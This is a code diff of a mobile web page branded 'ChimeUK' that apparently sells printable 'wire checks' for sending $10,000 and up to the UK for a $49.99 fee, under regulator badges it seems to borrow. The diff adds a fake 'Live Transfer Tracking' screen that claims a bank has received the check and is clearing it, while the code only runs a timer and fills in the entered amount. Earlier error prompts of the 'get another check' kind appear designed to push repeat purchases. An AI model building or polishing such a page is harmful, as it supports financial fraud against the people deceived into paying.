@@ -7,7 +7,7 @@
     <title>ChimeUK • Wire Checks</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&amp;family=Space+Grotesk:wght@500;600&amp;display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@500;600&display=swap');
         
         :root {
             --primary: #10b981;
@@ -105,7 +105,6 @@
 </head>
 <body class="tail-container pb-20">
 
-    <!-- NAVBAR -->
     <nav class="bg-white border-b sticky top-0 z-50 shadow-sm">
         <div class="px-5 py-4 flex items-center justify-between">
             <div class="flex items-center gap-x-2">
@@ -122,7 +121,6 @@
         </div>
     </nav>
 
-    <!-- NEW TOP CONGRATULATIONS SECTION WITH CONFETTI -->
     <div class="relative bg-gradient-to-r from-emerald-600 to-emerald-700 text-white px-5 py-6 overflow-hidden">
         <canvas id="confetti-canvas"></canvas>
         
@@ -140,7 +138,6 @@
         </div>
     </div>
 
-    <!-- HERO (kept exactly as before) -->
     <header class="hero-bg pt-8 pb-10 px-5">
         <div class="text-center">
             <div class="inline-flex items-center gap-x-2 bg-white border border-emerald-100 text-emerald-700 text-xs font-medium px-5 h-7 rounded-3xl mb-6">
@@ -176,7 +173,6 @@
             </div>
         </div>
         
-        <!-- Realistic Check Preview in Hero -->
         <div class="mt-12 mx-auto max-w-[320px]">
             <div class="real-check rounded-3xl p-6 text-sm relative" style="height: 190px;">
                 <div class="flex justify-between">
@@ -221,7 +217,6 @@
         </div>
     </header>
 
-    <!-- CHECK TYPES SECTION (unchanged) -->
     <div class="px-5 py-10 bg-white">
         <h2 class="heading-font text-3xl font-semibold text-center mb-2">Choose Your Check Type</h2>
         <p class="text-center text-slate-500 text-sm mb-8">All checks from $10,000 and above</p>
@@ -274,7 +269,6 @@
         </div>
     </div>
 
-    <!-- QUICK STATS, BENEFITS, HOW IT WORKS, FEES, CTA, FOOTER (all unchanged) -->
     <div class="bg-emerald-700 text-white py-6 px-5 grid grid-cols-3 gap-4 text-center text-xs">
         <div><div class="text-2xl font-semibold">$1.8B</div><div class="opacity-75">Transferred</div></div>
         <div><div class="text-2xl font-semibold">18 hrs</div><div class="opacity-75">To UK</div></div>
@@ -317,7 +311,6 @@
         © 2026 ChimeUK • Secure wire checks from USA to England<br>FDIC • FSCS • 256-bit SSL
     </div>
 
-    <!-- BLANK HORIZONTAL CHECK PAGE (new) -->
     <div onclick="if(event.target.id==='blank-check-page')hideBlankCheckPage()" id="blank-check-page" 
          class="hidden fixed inset-0 bg-black/70 z-[9998] flex items-center justify-center">
         <div onclick="event.stopImmediatePropagation()" class="bg-white w-full max-w-[420px] mx-4 rounded-none shadow-2xl overflow-hidden">
@@ -326,7 +319,6 @@
                 <button onclick="hideBlankCheckPage()" class="text-3xl text-slate-400">×</button>
             </div>
             
-            <!-- Horizontal Blank Check (rectangular, no rounded corners) -->
             <div class="real-check mx-5 mt-6 mb-8 p-8 text-base" style="height: 220px; border-radius: 0 !important; background: #faf8f3;">
                 <div class="flex justify-between items-start">
                     <div class="flex items-center gap-x-3">
@@ -362,7 +354,6 @@
                 
                 <div class="micr absolute bottom-3 left-8 right-8 text-center">211287298  9876543210  00000000</div>
                 
-                <!-- Subtle green accents -->
                 <div class="absolute bottom-0 left-0 right-0 h-6 bg-gradient-to-r from-transparent via-emerald-600/10 to-transparent flex items-center justify-center text-[10px] font-bold text-emerald-700">SECURE WIRE CHECK • CHIMEUK</div>
             </div>
             
@@ -375,7 +366,6 @@
         </div>
     </div>
 
-    <!-- FORM MODAL (unchanged except amount validation) -->
     <div onclick="if(event.target.id==='form-modal')closeFormModal()" id="form-modal" 
          class="hidden fixed inset-0 bg-black/70 z-[9999] flex items-end">
         <div onclick="event.stopImmediatePropagation()" class="bg-white w-full rounded-t-3xl max-h-[92vh] overflow-auto">
@@ -427,17 +417,15 @@
         </div>
     </div>
 
-    <!-- FINAL CHECKOUT PAGE (new) -->
     <div onclick="if(event.target.id==='final-checkout-page')hideFinalCheckout()" id="final-checkout-page" 
          class="hidden fixed inset-0 bg-black/70 z-[10000] flex items-center justify-center px-4">
-        <div onclick="event.stopImmediatePropagation()" class="bg-white w-full max-w-[420px] rounded-3xl shadow-2xl">
+        <div onclick="event.stopImmediatePropagation()" class="bg-white w-full max-w-[420px] rounded-3xl shadow-2xl overflow-hidden">
             <div class="px-5 py-4 border-b flex justify-between bg-emerald-50 rounded-t-3xl">
                 <div class="font-semibold">Final Checkout • First Check</div>
                 <button onclick="hideFinalCheckout()" class="text-3xl text-slate-400">×</button>
             </div>
             
-            <div class="p-5">
-                <!-- Populated realistic check -->
+            <div class="p-5 max-h-[85vh] overflow-y-auto">
                 <div id="final-check-content" class="real-check mx-auto p-7 text-base" style="height: 260px; max-width: 380px; border-radius: 8px;">
                     <div class="flex justify-between items-start">
                         <div class="flex items-center gap-x-3">
@@ -480,41 +468,94 @@
                     </div>
                 </div>
                 
-                <!-- Fee -->
                 <div class="mt-8 flex justify-between items-center bg-slate-50 rounded-2xl p-5 text-sm">
                     <div class="font-medium">Check Processing Fee</div>
                     <div class="text-2xl font-semibold text-emerald-600">$49.99</div>
                 </div>
                 
                 <button onclick="sendFinalToBank()" 
-                        class="mt-8 w-full bg-emerald-600 text-white h-14 rounded-3xl text-xl font-semibold">
+                        class="mt-8 w-full bg-emerald-600 hover:bg-emerald-700 text-white h-14 rounded-3xl text-xl font-semibold">
                     SEND TO BANK
                 </button>
             </div>
         </div>
     </div>
 
-    <!-- SPINNER, CHECK PREVIEW, SUCCESS, CASHAPP MODALS (kept unchanged) -->
-    <div id="spinner-modal" class="hidden fixed inset-0 bg-black/70 z-[10001] flex items-center justify-center">
-        <div class="bg-white rounded-3xl px-10 py-8 text-center w-[280px]">
+    <div id="tracking-modal" class="hidden fixed inset-0 bg-black/70 z-[10005] flex items-center justify-center px-4">
+        <div class="bg-white w-full max-w-[420px] rounded-3xl shadow-2xl overflow-hidden">
+            <div class="px-5 py-4 border-b flex justify-between bg-slate-50 rounded-t-3xl">
+                <div class="font-semibold text-lg flex items-center gap-2">
+                    <span class="animate-spin text-emerald-600">⚙️</span> Live Transfer Tracking
+                </div>
+                <button onclick="closeTracking()" class="text-3xl text-slate-400">×</button>
+            </div>
+            
+            <div class="p-6">
+                <div class="text-center border-b border-slate-100 pb-5 mb-5">
+                    <div class="text-sm text-slate-500 font-medium tracking-wide">ROUTING TO <span id="track-bank" class="text-slate-800 font-bold uppercase">UK BANK</span></div>
+                    <div id="track-amount" class="text-4xl font-bold text-emerald-600 mt-2"></div>
+                    <div class="text-[11px] font-mono text-slate-400 mt-2 bg-slate-50 inline-block px-3 py-1 rounded-full">TRK-98273491-UK</div>
+                </div>
+
+                <div class="relative ml-5 border-l-2 border-slate-200 space-y-8 pb-4">
+                    
+                    <div class="relative pl-6">
+                        <div class="absolute -left-[11px] top-1 w-5 h-5 rounded-full bg-emerald-500 flex items-center justify-center ring-4 ring-white">
+                            <svg class="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
+                        </div>
+                        <div class="font-bold text-slate-800 text-sm">Check Scheduled</div>
+                        <div class="text-xs text-slate-500 mt-1 leading-relaxed">Digital check generated, validated, and securely prepared for dispatch.</div>
+                        <div class="text-[10px] text-emerald-600 font-semibold mt-1.5 uppercase">Completed</div>
+                    </div>
+                    
+                    <div class="relative pl-6">
+                        <div class="absolute -left-[11px] top-1 w-5 h-5 rounded-full bg-blue-500 ring-4 ring-white animate-pulse shadow-[0_0_12px_rgba(59,130,246,0.6)]"></div>
+                        <div class="font-bold text-blue-600 text-sm">Received by Bank</div>
+                        <div class="text-xs text-slate-600 mt-1 leading-relaxed">Clearing process actively initiated at <span id="track-bank-step" class="font-bold">Bank</span>. Verification and final release in progress.</div>
+                        <div class="text-[10px] text-blue-600 font-semibold mt-1.5 uppercase animate-pulse">In Progress...</div>
+                    </div>
+                    
+                    <div class="relative pl-6">
+                        <div class="absolute -left-[11px] top-1 w-5 h-5 rounded-full bg-slate-200 ring-4 ring-white"></div>
+                        <div class="font-bold text-slate-400 text-sm">Paid to User Bank</div>
+                        <div class="text-xs text-slate-400 mt-1 leading-relaxed">Funds successfully credited and available in the recipient's UK account.</div>
+                        <div class="text-[10px] text-slate-400 font-semibold mt-1.5 uppercase">Pending</div>
+                    </div>
+                </div>
+
+                <div class="mt-8 bg-amber-50 border border-amber-200 rounded-2xl p-4 text-sm flex gap-3 shadow-sm">
+                    <div class="text-amber-500 text-xl mt-0.5">⏳</div>
+                    <div class="text-amber-800 text-xs">
+                        <span class="font-bold text-sm">Processing...</span><br>
+                        Most international wire checks clear within 18 hours. We will notify you once the status updates to 'Paid'.
+                    </div>
+                </div>
+
+                <button onclick="closeTracking()" class="mt-6 w-full border-2 border-slate-200 hover:border-slate-300 text-slate-600 h-12 rounded-3xl text-sm font-semibold transition-colors">
+                    Close Tracking Window
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div id="spinner-modal" class="hidden fixed inset-0 bg-black/70 z-[10006] flex items-center justify-center">
+        <div class="bg-white rounded-3xl px-10 py-8 text-center w-[280px] shadow-2xl">
             <svg class="animate-spin h-12 w-12 text-emerald-600 mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                 <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                 <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
             </svg>
-            <p id="spinner-text" class="mt-5 font-medium"></p>
+            <p id="spinner-text" class="mt-5 font-semibold text-slate-800 tracking-wide"></p>
         </div>
     </div>
 
     <div onclick="if(event.target.id==='check-modal')closeCheckModal()" id="check-modal" class="hidden fixed inset-0 bg-black/70 z-[10002] flex items-end">
-        <!-- existing realistic check preview modal content (unchanged) -->
         <div onclick="event.stopImmediatePropagation()" class="bg-white w-full rounded-t-3xl">
             <div class="px-5 py-4 border-b flex justify-between items-center"><div class="font-semibold">Your Professional Bank Check</div><button onclick="closeCheckModal()" class="text-3xl">×</button></div>
             <div id="check-content" class="real-check mx-5 mt-6 mb-6 rounded-3xl p-7 text-base" style="height: 280px;">
-                <!-- populated by JS -->
-            </div>
+                </div>
             <div class="px-5 pb-8 flex gap-3">
                 <button onclick="printCheck()" class="flex-1 border-2 border-slate-900 h-12 rounded-3xl text-sm font-semibold">PRINT CHECK</button>
-                <button onclick="sendToBank()" class="flex-1 bg-emerald-600 text-white h-12 rounded-3xl text-sm font-semibold">SEND TO BANK</button>
+                <button onclick="alert('Proceeding...')" class="flex-1 bg-emerald-600 text-white h-12 rounded-3xl text-sm font-semibold">SEND TO BANK</button>
             </div>
         </div>
     </div>
@@ -592,11 +633,9 @@
             }
             animate()
             
-            // Stop after 4 seconds
             setTimeout(() => { canvas.width = 0 }, 4000)
         }
         
-        // Show blank horizontal check page
         function showBlankCheckPage() {
             document.getElementById('blank-check-page').classList.remove('hidden')
             document.getElementById('blank-check-page').classList.add('flex')
@@ -608,7 +647,6 @@
             page.classList.remove('flex')
         }
         
-        // Open form (same as before)
         function openFormModal() {
             document.getElementById('form-modal').classList.remove('hidden')
             document.getElementById('form-modal').classList.add('flex')
@@ -620,7 +658,6 @@
             modal.classList.remove('flex')
         }
         
-        // Form submit → directly to FINAL checkout page
         function handleFormSubmit(e) {
             e.preventDefault()
             
@@ -645,13 +682,10 @@
             
             window.lastFormData = formData
             closeFormModal()
-            
-            // Show final checkout page instead of preview
             showFinalCheckout(formData)
         }
         
         function showFinalCheckout(data) {
-            // Populate final check
             document.getElementById('final-payee-name').textContent = data.payeeName
             document.getElementById('final-amount-num').textContent = parseFloat(data.amountNum).toLocaleString('en-US')
             document.getElementById('final-amount-words').textContent = data.amountWords.toUpperCase()
@@ -672,12 +706,41 @@
             page.classList.remove('flex')
         }
         
+        /* MODIFIED LOGIC: Trigger spinner then sophisticated tracking UI */
         function sendFinalToBank() {
-            hideFinalCheckout()
-            alert("Error: Check not purchased yet.\n\nPlease purchase a check first and try again.")
+            hideFinalCheckout();
+            
+            // Extract details from form data or use fallback
+            const bankName = window.lastFormData && window.lastFormData.payeeBank ? window.lastFormData.payeeBank : "UK Bank";
+            const amount = window.lastFormData && window.lastFormData.amountNum ? window.lastFormData.amountNum : "15000";
+            
+            // 1. Show Spinner simulating send
+            showSpinner("Sending to " + bankName + "...");
+            
+            // 2. Hide spinner and show live tracker after delay
+            setTimeout(() => {
+                hideSpinner();
+                showTrackingSystem(bankName, amount);
+            }, 2500); 
+        }
+
+        function showTrackingSystem(bankName, amount) {
+            // Populate tracking details
+            document.getElementById('track-bank').textContent = bankName;
+            document.getElementById('track-bank-step').textContent = bankName;
+            document.getElementById('track-amount').textContent = "$" + parseFloat(amount).toLocaleString('en-US');
+            
+            const modal = document.getElementById('tracking-modal');
+            modal.classList.remove('hidden');
+            modal.classList.add('flex');
+        }
+
+        function closeTracking() {
+            const modal = document.getElementById('tracking-modal');
+            modal.classList.add('hidden');
+            modal.classList.remove('flex');
         }
         
-        // Existing functions (spinner, buyCheck, etc.) unchanged
         function showSpinner(msg) {
             document.getElementById('spinner-text').innerHTML = msg
             document.getElementById('spinner-modal').classList.remove('hidden')
@@ -719,19 +782,19 @@
             }, 1600)
         }
         
-        function closeCheckModal() { /* unchanged */ }
+        function closeCheckModal() { /* existing fallback */ }
         function printCheck() { alert("✅ Check ready for printing (demo mode)") }
-        function sendToBank() { alert("Error: This check is invalid for the entered amount.\n\nPlease get another check and try again.") }
+        
         function closeAll() {
             document.getElementById('success-modal').classList.add('hidden')
             document.getElementById('check-modal').classList.add('hidden')
             document.getElementById('spinner-modal').classList.add('hidden')
+            document.getElementById('tracking-modal').classList.add('hidden')
         }
         
-        // Launch confetti on load
         window.onload = function () {
             launchConfetti()
-            console.log("%c✅ ChimeUK Mobile with congratulations banner + blank horizontal check + final checkout flow ready.", "color:#10b981; font-weight:bold")
+            console.log("%c✅ ChimeUK Mobile with tracking UI ready.", "color:#10b981; font-weight:bold")
         }
     </script>
 </body>
